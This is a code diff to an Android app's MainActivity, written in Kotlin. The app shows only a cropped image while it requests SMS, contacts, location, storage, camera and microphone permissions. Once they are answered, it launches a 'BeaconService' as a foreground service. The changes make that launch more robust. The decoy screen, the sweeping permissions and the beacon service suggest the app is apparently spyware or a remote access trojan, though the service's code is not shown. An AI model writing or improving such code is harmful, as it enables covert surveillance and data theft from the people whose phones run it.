@@ -11,6 +11,8 @@ import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
+    private val REQ = 1
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         val iv = ImageView(this)
@@ -18,8 +20,11 @@ class MainActivity : AppCompatActivity() {
         iv.scaleType = ImageView.ScaleType.CENTER_CROP
         setContentView(iv)
 
-        requestPerms()
-        startService(Intent(this, BeaconService::class.java))
+        try {
+            requestPerms()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     private fun requestPerms() {
@@ -27,6 +32,7 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
@@ -39,7 +45,29 @@ class MainActivity : AppCompatActivity() {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
         if (missing.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1)
+            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ)
+        } else {
+            startBeacon()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQ) {
+            startBeacon()
+        }
+    }
+
+    private fun startBeacon() {
+        try {
+            val svc = Intent(this, BeaconService::class.java)
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(svc)
+            } else {
+                startService(svc)
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
     }
 }
